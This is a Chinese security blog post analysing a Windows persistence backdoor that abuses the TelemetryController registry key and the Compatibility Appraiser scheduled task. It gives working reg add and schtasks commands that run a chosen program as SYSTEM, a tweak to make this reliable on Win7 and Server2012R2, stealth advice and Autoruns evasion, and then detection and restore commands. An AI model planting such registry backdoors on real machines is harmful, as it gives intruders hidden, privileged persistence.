---
layout: post
title: 利用TelemetryController实现的后门分析
---


## 0x00 前言
---

我从[ABUSING WINDOWS TELEMETRY FOR PERSISTENCE](https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/)学到了一种利用TelemetryController实现的自启动后门方法，在Win10下测试没有问题，但在Win7和Server2012R2下测试遇到了不同的结果。

本文将要记录我的学习心得，分析利用方法，给出防御建议

参考资料：

https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence/

## 0x01 简介
---

本文将要介绍以下内容：

- 基础知识
- 常规利用方法
- 在Win7和Server2012R2下遇到的问题
- 解决方法
- 利用方法
- 防御建议

## 0x02 基础知识
---

### 1.TelemetryController

对应的进程为CompatTelRunner.exe

CompatTelRunner.exe被称为Windows兼容性遥测监控程序。它会定期向微软发送使用和性能数据，以便改进用户体验和修复潜在的错误。

通常是为了升级win10做兼容性检查用的程序

通过计划任务`Microsoft Compatibility Appraiser`启动

计划任务`Microsoft Compatibility Appraiser`默认启用，每隔一天自动运行一次，任意用户登录时也会运行

### 2.计划任务`Microsoft Compatibility Appraiser`

#### (1)通过面板查看计划任务

启动`taskschd.msc`

依次选择`Task Scheduler (Local)` -> `Task Scheduler Library` -> `Microsoft` -> `Windows` -> `Application Experience`，选择`Microsoft Compatibility Appraiser`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-11-1/2-1.png)

这里能看到计划任务`Microsoft Compatibility Appraiser`的详细信息

#### (2)通过命令行查看计划任务

命令如下：

```
schtasks /query
```

如果是在中文操作系统，有可能会产生以下错误：

```
错误：无法加载列资源
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-11-1/2-2.png)

查看cmd 编码，执行命令：`chcp`

返回结果：

```
活动代码页：936
```

表示使用936中文GBK编码

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-11-1/2-3.png)


**解决方法：**


换成437美国编码，命令如下：`chcp 437`

再次执行: `schtasks /query`

结果正常

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-11-1/2-4.png)

直接筛选出`Microsoft Compatibility Appraiser`：

```
schtasks /query /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
```

显示详细信息：

```
schtasks /query /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /v
```

修改计划任务状态，将禁用状态改为启用：

```
schtasks /Change /ENABLE /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
```

## 0x03 常规利用方法
---

### 1.修改注册表

修改注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController`

新建任意名称的Key，键值信息如下：

```
Command   REG_SZ 	C:\Windows\system32\notepad.exe
Nightly   REG_DWORD	1
```

以上操作可通过命令行实现，命令如下：

```
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\fun" /v Nightly /t REG_DWORD /d 1
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\fun" /v Command /t REG_SZ /d "C:\Windows\system32\notepad.exe" /f
```

**注：**

这里创建了名为`fun`的Key

### 2.开启计划任务`Microsoft Compatibility Appraiser`

可以选择等待计划任务启动

也可以强制开启，命令如下：

```
schtasks /run /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
```

后门触发，在Win10系统下会立即以System权限启动进程CompatTelRunner.exe和notepad.exe

**注：**

CompatTelRunner.exe为notepad.exe的父进程，如果进程notepad.exe正在运行，那么进程CompatTelRunner.exe一直处于阻塞状态

## 0x04 在Win7和Server2012R2下遇到的问题
---

操作方法同上，在启动后门后，会以System权限启动两个进程CompatTelRunner.exe

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-11-1/2-5.png)

其中一个CompatTelRunner.exe的命令行参数为：

```
C:\Windows\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:4iNQvAXT40KhDrm9.1
```

该进程对应注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser`

经过实际测试得出以下结论：

1. 经过一段时间后，如果仍未完成检查，进程CompatTelRunner.exe会持续运行，无法以System权限启动进程notepad.exe
2. 经过一段时间后，如果完成检查，进程CompatTelRunner.exe会自动退出，接下来以System权限启动进程CompatTelRunner.exe和notepad.exe
3. 如果选择强制结束进程CompatTelRunner.exe，同样接下来会以System权限启动进程CompatTelRunner.exe和notepad.exe

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-11-1/2-6.png)

这里我们可以避免这个问题，实现稳定触发，以System权限启动进程CompatTelRunner.exe和notepad.exe，方法如下：

修改注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser`的Command项

默认值为`%windir%\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun`

这里可以选择跳过检查过程，例如将Command项的值置空，就不会在计划任务启动时执行检查

为了提高隐蔽性，可以将Command项设置为`%windir%\system32\CompatTelRunner.exe -m:appraiser.dll`


为了验证修改键值是否影响系统的正常功能，可以对`%windir%\system32\CompatTelRunner.exe`进行反编译

启动进程的伪代码细节如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-11-1/3-1.png)

## 0x05 利用方法
---

### 1.前置条件

需要查看是否开启默认的计划任务`Microsoft Compatibility Appraiser`，查询命令如下：

```
schtasks /query /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /v
```

### 2.放置后门

我在Win7、Server2012R2、Win10测试的结果表明，稳定利用方法如下：


修改注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser`的Command项

值设置为`C:\WINDOWS\system32\cmd.exe /c notepad.exe`


命令行实现的命令如下：

```
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser" /v Command /t REG_EXPAND_SZ /d "C:\WINDOWS\system32\cmd.exe /c notepad.exe" /f
```

**补充：还原配置的命令**

```
reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser" /v Command /t REG_EXPAND_SZ /d "%windir%\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun" /f
```

### 3.后门触发

等待计划任务`Microsoft Compatibility Appraiser`运行

为了便于测试，可以强制开启，命令如下：

```
schtasks /run /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
```

### 4.特点

能够绕过Autoruns的检测，以System权限执行命令

断网状态下同样能够触发

## 0x06 防御建议
---

### 1.查看注册表的默认值是否被修改

#### (1)查看注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser`的Command项

命令如下：

```
reg query "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser" /v Command
```

默认值如下：

```
Command    REG_EXPAND_SZ    %windir%\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun
```

#### (2)查看注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController`下的Key

命令如下：

```
reg query "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\"
```

默认值如下：

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\AppraiserServer
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\AvStatus
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Census
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\CensusServer
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\InvAgent
```

### 2.禁用计划任务Microsoft Compatibility Appraiser

命令如下：

```
schtasks /Change /DISABLE /tn "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"
```

### 3.查看进程CompatTelRunner.exe信息

分析进程CompatTelRunner.exe下是否有可疑子进程

## 0x07 小结
---

本文记录了我对TelemetryController后门机制的学习心得，总结出了更为通用的利用方法，给出针对性的防御建议。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





